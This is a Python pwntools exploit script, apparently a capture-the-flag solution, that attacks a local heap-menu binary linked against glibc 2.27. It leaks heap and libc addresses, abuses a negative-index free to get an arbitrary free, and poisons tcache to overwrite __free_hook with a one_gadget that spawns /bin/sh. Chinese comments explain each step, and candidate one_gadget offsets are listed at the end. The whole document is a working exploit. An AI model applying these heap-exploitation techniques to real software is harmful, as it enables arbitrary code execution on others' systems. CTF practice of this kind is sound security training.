from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=process("./chall")
libc=ELF("./libc-2.27.so")

def add(s):
    io.sendlineafter(b"> ",b"1")
    io.sendlineafter(b"size: ",str(s))
    
def delete(n):
    io.sendlineafter(b"> ",b"2")
    io.sendlineafter(b"idx: ",str(n))

def show(n):
    io.sendlineafter(b"> ",b"3")
    io.sendlineafter(b"idx: ",str(n))
    
def edit(n,cc):
    io.sendlineafter(b"> ",b"4")
    io.sendlineafter(b"idx: ",str(n))
    io.sendafter(b"content: ",cc)

add(0x80) #0 
add(0x80) #1
delete(1)
delete(0)
add(0x80) #0
show(0)
heap_addr=u64(io.recv(6).ljust(8,b"\x00"))-0x3c0
print("heap_addr: ",hex(heap_addr))
# add(0x10)
edit(0,cyclic(0x80))

for i in range(7):
    add(0x80)

add(0x10) #8

for i in range(8):
    delete(i)

for i in range(7):
    add(0x80) #0~6

add(0x10) #7
show(7)
leak_addr=u64(io.recv(6).ljust(8,b"\x00"))+0x1bc8-libc.sym[b"__free_hook"]
print("leak_addr: ",hex(leak_addr))

free_hook=leak_addr+libc.sym[b"__free_hook"]
shell=leak_addr+0x4f322

gdb.attach(io)
pause()

print("free_hook: ",hex(free_hook))

edit(7,p64(heap_addr+0x870)) #chunk 8的指针堆块
edit(1,p64(heap_addr+0x7e0)) #chunk1内容堆块->chunk 7的内容堆块->chunk 8的指针堆块


###任意地址free，此处free的是chunk 1的内容堆块
idx=((1<<63)+0x84) - (1<<64) 
delete(idx)
print(hex(idx))
###偏移用(chunk 1内容堆块地址-(heap_addr+0x260))>>3即可
###具体看反编译后delete函数内容


add(0x10) #9
edit(9,p64(free_hook))  #chunk 9实际上是chunk 8的指针堆块
edit(8,p64(shell)) #修改chunk 8内容为one_gadget
print("shell: ",hex(shell))
delete(8) #delete即可getshell

io.interactive()

# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
